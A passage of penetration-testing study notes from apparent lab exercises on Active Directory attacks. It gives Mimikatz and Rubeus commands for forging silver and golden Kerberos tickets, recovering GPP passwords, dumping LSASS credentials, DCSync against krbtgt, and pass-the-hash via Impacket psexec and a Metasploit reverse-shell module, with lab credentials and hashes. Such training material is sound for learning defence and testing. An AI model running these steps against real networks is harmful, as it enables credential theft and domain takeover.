* Lastly, you will use Rubeus to load the silver ticket created (`ticket.kirbi`) into your current session --> `Rubeus ptt /ticket:ticket.kirbi`. With all of this done correctly, you should be all good to use the service!
  * Note: Mimikatz will add a very large expiration time for the ticket, which is one way that silver and golden tickets are detected.
* Silver ticket tasks:
  * Forge a TGS ticket issued by **iis_service** for the user **Administrator**. Use it to connect to **http://workstation-02.krbtown.local** and get the token. The website only allows users of the DAs group to visit it. You can assume you have already dumped the password hash for this account, which can be found in the Credentials panel.
  * **Task 2**: `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:iis_service /service:HTTP /target:workstation-02.krbtown.local /rc4:a08625a061f6bf4d421651524a778f68` --> `Rubeus.exe ptt /ticket:ticket.kirbi`. Launched the service through the equivalent of PowerShell cURL (iwr or `Invoke-WebRequest`). With UseDefaultCredentials, it tells PS to automatically send the NTLM or the Kerberos tokens of the user currently running the command to the target service --> `iwr -UseDefaultCredentials https://workstation-02.krbtown.local`. 
* Keep in mind that hostnames must be used to force Kerberos authentication; connecting by IP address will cause NTLM to be used and the attack to fail.
  * Clear tickets by `klist purge`.
###### Golden Tickets
* The golden ticket attack is similar to silver ticket, but it provides an attacker with a lot more access. The attack forges a TGT for any user of the domain. As mentioned in previous labs (?), a TGT is deemed valid if it's encrypted with the password hash of the KRBTGT account. By obtaining this hash, an attacker can effectively impersonate any user of the domain, including domain admins and non-existing users. The prerequisites for the attack are:
  * Domain SID
  * Domain FQDN
  * KRBTGT's password hash
  * Username to impersonate
* The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the Domain Controller (DC), a DCSync attack, or a shadow copy on the DC. Either way, you must generally achieve domain admin privileges or compromise a DC to obtain this hash. For the purpose of this lab, this hash will be provided to you. The user to impersonate can be any user of the domain or even non-existing users within the administrator RID. The Mimikatz command for golden ticket is as follows: `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`.
  * RID is relative identifier, it's the last four digits we chop off for the SID. You can list all users in a domain by `net user /domain`, list all members of the DA group by `net group "Domain Admins" /domain`, and find detailed info on one user with `net user <username> /domain`. 
* Golden ticket tasks:
  * Perform golden ticket attack and create a TGT for the **Administrator** account. Once you've created your TGT for the Administrator user and loaded it into memory, use **PsExec** with the following syntax to establish a session on the DC: `PsExec64.exe \\dc01.krbtown.local cmd`.
  * **Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows.
 
### LAB: Active Directory Domain Passwords
* You'll need to use Get-GPPPassword to find the plaintext password of a local administrator in GPP. Next, you'll need to use Mimikatz to dump a logged-in Domain Admin's credentials, before using the dumped Domain Admin's credentials to run a DCSync attack against the **ORCHID/krbtgt** account.
* **Task 1**: `xfreerdp /v:10.102.9.46 /u:m.gibbs /p:jWU9G2Ux#MDxOBrHik /dynamic-resolution +clipboard +drives /drive:share,/home/kali`
* **Tasks 2 and 3**: `. .\Get-GPPPassword.ps1` and then `Get-GPPPassword`. We found the username `NewAdmin` and the password `PasswordInGPPIsNotSafe`.
* **Tasks 7 and 8**: `xfreerdp /v:10.102.9.46 /u:NewAdmin /p:PasswordInGPPIsNotSafe /dynamic-resolution +clipboard +drives /drive:share,/home/kali`. Used `privilege::debug` and then `sekurlsa::logonpasswords` and found j.russ's password, which was `fV#8zB2H@7xC6Q!PjuZ&JLqX`. j.russ was a domain admin - so this is the jackpot!
* Next tasks was a DCSync attack, which I did with `lsadump::dcsync /user:ORCHID\krbtgt`. I had to double check the FQDN name with `systeminfo | findstr /B /C:"Domain"`.
* The overall flow of the attack was using `get-GPPPassword.ps1` on the original target, `m.gibbs` --> receive username `NewAdmin` and password `PasswordInGPPIsNotSafe` from GPPPassword.ps1 --> log into New Admin --> run `sekurlsa::logonpasswords` and get j.russ, who is a DA --> connect as j.russ, run Mimikatz --> `lsadump::dcsync /user:ORCHID\krbtgt` for DCSync attack. 

# Pass-the-Hash
* PTH is a credential theft and lateral movement technique that involves stealing a user's hash password and using it to authenticate to other machines or services within a network. You can authenticate without having to spend time and resourcecs decrypting the hash to reveal the plaintext password.
* With the password hash, you can move laterally to previously unauthorized machines or use it to spawn processes with the stolen user's privileges for further domain exploitation. The password hash is usually stored as a New Technology LAN Manager (NTLM) hash, which can be extracted with tools like Mimikatz.
  * Once obtained, you can use this hash with Mimikatz to spawn processes with the stolen privileges or run PsExec or Metasploit against more desirable targets, such as the Domain Controller.
  * To use PTH tools, you'll need administrator privileges on your compromised machine.

## NTLM Hashes
* An NTLM hash is a crytopgrahic version of a user's password, used by Windows systems. NTLM hashes are stored in a DC's Security Accounts Manager (SAM) or New Technology Directory Services (NTDS) file.
  * The hash consists of 32 hexadecimal characters, a mix of numbers (0-9) and letters (A-F). An example NTLM hash is `5CE25A953A0DCF5D32B7A6FEFC21DD18`.
* While NTLM hashes provide a level of security by not storing plaintext passwords, the way these hashes are managed can be exploited. When a user logs into a machine, LSASS (Local Security Authority Subsystem Service) handles the authentication process and stores the user's NTLM hash into system memory. You can extract these hashes from LSASS memory and inject them back into the system through a system call to impersonate the user.
  * In remote attacks, tools like PsExec exploit services like SMB (Server Message Block), which are designed to accept a hash instead of a password for authentication.
* This makes LSASS a prime target to exploit NTLM hashes from to use in a pass-the-hash attack.

## Mimikatz 
* With local admin credentials, you'll be able to use Mimikatz to extract hashes (for example, from LSASS). As a quick recap, to do this, you need to run Mimikatz as an admin on your target and set debug privileges with `privilege::debug`. User sessions can then be dumped with `sekurlsa::logonpasswords`. Once you've stolen the password hash, you can now use it to authenticate using a pass-the-hash technique. 

## Pass-the-Hash with Mimikatz
* With your NTLM hash, you can use the `sekurlsa::pth` command in Mimikatz to spawn a new process with the provided username and hash, and the process will open with the user's privileges. So, if you've stolen a Domain Admin hash, you'll now be able to open processes as the Domain Admin. To do this, use the following Mimikatz command with the stolen hash. You'll need to provide the compromised user's username, the domain name, and the NTLM hash:
  * This command will then spawn a new process (by default, cmd.exe), with the privileges of the provided user.
  * With these new privileges, there are likely numerous ways to access the DC. One simple way is to change the plaintext password of the user whose NTLM password hash you've stolen to something of your choice. For example, you can change their password by running the following command: `net user Example-Admin password123! /domain`. Once you've done that, you can use those credentials to connect to the DC! 
```
sekurlsa::pth /user:<username> /domain:<Domain> /ntlm:<NTLM Hash>
---
mimikatz # sekurlsa::pth /user:Example-Admin /domain:example.com/ntlm:9BFEA4F8177A11F06B37957A55B13F70
user    : Example-Admin
domain  : example.com
program : cmd.exe
impers. : no
NTLM    : 9BFEA4F8177A11F06B37957A55B13F70
 |  PID  5728
 |  TID  928
 |  LSA Process is now R/W
 |  LUID 0 ; 1358436 (00000000:0014ba64)
 \_ msv1_0   - data copy @ 000002105DA0DA00 : OK !
 \_ kerberos - data copy @ 000002105DA8B6C8
  \_ des_cbc_md4       -> null
  \_ des_cbc_md4       OK
  \_ des_cbc_md4       OK
  \_ des_cbc_md4       OK
  \_ des_cbc_md4       OK
  \_ des_cbc_md4       OK
  \_ des_cbc_md4       OK
  \_ *Password replace @ 000002105D3058F8 (32) -> null

```
## PsExec
* The PsExec tool is part of the SysInternals Suite that allows users to launch an interactive command prompt on a remote system, execute processes, and redirect the output to the local system. However, you can exploit PsExec's features and functionalities for a pass-the-hash attack.
* Once you have a username and their NTLM hash, you can use PsExec to authenticate to a remote machine without the plaintext password. The syntax for this command would look something like `./psexec.py -hashes :<NTLM hash> <Domain>/<Username>@<Target IP>`
* You can run PsExec either from the directory the script is in with `./` or by providing the full file path. Using the previous example with the username `Example-Admin` would be `./psexec.py -hashes :9BFEA4F8177A11F06B37957A55B13F70 example.com/Example-Admin@<Target IP>`. The output would then look something like the following. If your hash is successfully passed, you'll have a shell on the target with the provided credentials:
  * If you are wondering why we included the colon appended to the start of the NTLM hash, it's because Microsoft still expects the old format, [LM]:[NTLM]. Need to let them know you do not have the LM (LAN Manager) hash. 
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on <Target IP>.....
[*] Found writable share ADMIN$
[*] Uploading file RQVmzfVc.exe
[*] Opening SVCManager on <Target IP>.....
[*] Creating service YTms on <Target IP>.....
[*] Starting service YTms.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3091]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
## Pass-the-hash with Metasploit
* Alternatively to PsExec, Metasploit has a PsExec exploit module, `exploit/windows/smb/psexec`, which allows you to run a pass-the-hash attack against a target:
```
Module options (exploit/windows/smb/psexec):

  Name               Current Setting  Required  Description
  ----               ---------------  --------  -----------
  SERVICE_DESCRIPTION                 no        Service description to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                no        The service display name
  SERVICE_NAME                        no        The service name
  SMBSHARE                            no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

  Used when connecting via an existing SESSION:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   no        The session to run this module on

  Used when making a new connection via RHOSTS:

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      445              no        The target port (TCP)
  SMBDomain  .                no        The Windows domain to use for authentication
  SMBPass                     no        The password for the specified username
  SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
  LHOST     10.102.2.31      yes       The listen address (an interface may be specified)
  LPORT     4444             yes       The listen port

Exploit target:

  Id  Name
  --  ----
  0   Automatic
```

